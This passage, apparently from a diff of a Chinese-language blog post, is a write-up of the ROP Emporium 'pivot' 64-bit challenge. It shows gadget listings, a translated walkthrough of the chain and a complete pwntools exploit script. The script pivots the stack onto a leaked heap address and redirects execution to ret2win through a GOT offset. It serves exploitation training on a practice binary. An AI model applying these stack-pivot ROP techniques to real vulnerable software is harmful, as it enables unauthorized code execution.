+0x00000000004008fa: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
+0x00000000004008eb: test eax, eax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400939: test eax, eax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400986: test eax, eax; je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x00000000004008ea: test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400938: test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400985: test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x0000000000400b03: xchg eax, esp; ret;
+0x0000000000400b02: xchg rax, rsp; ret;
+0x0000000000400989: int1; push rbp; mov rbp, rsp; call rax;
+0x0000000000400a39: leave; ret;
+0x0000000000400adf: nop; leave; ret;
+0x00000000004007c9: ret;
+
+93 gadgets found
+</code></pre>
+<p>合适的rop:</p>
+<ul>
+<li>1.第二次输入的ROP：</li>
+</ul>
+<pre><code>0x0000000000400b00: pop rax; ret;
+0x0000000000400b02: xchg rax, rsp; ret;
+</code></pre>
+<p>大致意思，这里引用<a href="https://www.rootnetsec.com/ropemporium-pivot/">ropemporium-pivot/</a>里面的解释</p>
+<blockquote>
+<ul>
+<li>Firstly let’s use 0x0000000000400b00: pop rax; ret;</li>
+<li>Then we can use the second place to enter the address of the buffer.</li>
+<li>Lastly swap values with 0x0000000000400b02: xchg rax, rsp; ret;</li>
+</ul>
+</blockquote>
+<p>翻译一下吧:</p>
+<blockquote>
+<ul>
+<li>首先使用0x0000000000400b00: pop rax; ret;    //弹出rax</li>
+<li>然后输入要迁移到的目的地</li>
+<li>最后交换二者的值:rax和rsp      //修改了rsp的值</li>
+</ul>
+</blockquote>
+<ul>
+<li>2.第一次输入的ROP：</li>
+</ul>
+<pre><code>0x0000000000400900: pop rbp; ret;
+0x0000000000400b05: mov rax, qword ptr [rax]; ret;
+0x000000000040098e: call rax;
+0x0000000000400b09: add rax, rbp; ret;
+</code></pre>
+<p>再次引用<a href="https://www.rootnetsec.com/ropemporium-pivot/">ropemporium-pivot/</a>里面的解释</p>
+<blockquote>
+<ul>
+<li>Firstly, let’s call the foothold_function to populate the .got.plt entry.</li>
+<li>After that pop the value of foothold_function’s got entry into the register rax.</li>
+<li>After that, we can move the the value from the address rax into rax.Now in rax we should have the contents of got entry for foothold_function.</li>
+<li>Add the offset to the rax register to get our ret2win function.</li>
+<li>Call it.</li>
+</ul>
+</blockquote>
+<p><strong>大致模拟:</strong></p>
+<ul>
+<li>接受堆块a1地址</li>
+<li>先写入后面的paylaod：</li>
+</ul>
+<blockquote>
+<p>1.调用foothold_function@plt
+2.弹出rax
+3.将foothold_function@got写入rax
+4.将rax指向的指针(foothold_functiond@got的地址)传递给rax
+5.弹出rbp
+6.写入数字(foothold_function和ret2win之差)
+7.让rax和rbp相加，并将结果返回给rax
+8.调用rax</p>
+</blockquote>
+<ul>
+<li>在第二次输入进行stack pivot</li>
+</ul>
+<h3>EXP</h3>
+<pre><code>from pwn import *
+context.log_level = &quot;debug&quot;
+p = process(&quot;./pivot&quot;)
+
+pop_rax_ret = 0x0400b00
+xchg_rax_rsp_ret = 0x0400b02
+
+pop_rbp_ret = 0x0400900
+mov_rax_prax_ret = 0x0400b05
+call_rax = 0x040098e
+add_rax_rbp_ret = 0x0400b09
+
+foothold_got = 0x0602048
+foothold_plt = 0x0400850
+heap_addr = int(p.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:').decode('UTF-8').split(' ')[-1], 16)
+
+payload1 = &quot;&quot;
+payload1 += p64(foothold_plt)
+payload1 += p64(pop_rax_ret)
+payload1 += p64(foothold_got)
+payload1 += p64(mov_rax_prax_ret)
+payload1 += p64(pop_rbp_ret)
+payload1 += p64(0x14e)
+payload1 += p64(add_rax_rbp_ret)
+payload1 += p64(call_rax)
+
+payload2 = 'a'*40
+payload2 += p64(pop_rax_ret)
+payload2 += p64(heap_addr)
+payload2 += p64(xchg_rax_rsp_ret)
+
+p.recvuntil(&quot;Send your second chain now and it will land there&quot;)
+p.sendline(payload1)
+
+p.recvuntil(&quot;Now kindly send your stack smash&quot;)
+#p.recvuntil(&quot;&gt; &quot;)
+p.sendline(payload2)
+
+print(p.recvall())
+p.interactive()
+</code></pre>
+<h3>总结</h3>
+<ul>
+<li>学习pwn的话可能很难，但是要靠积累吧，主要是一个持之以恒的东西。</li>
+<li>这是ROP Emporium 64位的最后一道题了，所以比较多的东西都揉在了一起，还是比较考脑力吧。</li>
+<li>ROP链的构造可能比较考察汇编能力吧，但是gadgets的功能真的是敢说敢做的。</li>
+</ul>
+
+</div>
+</div></body></html>
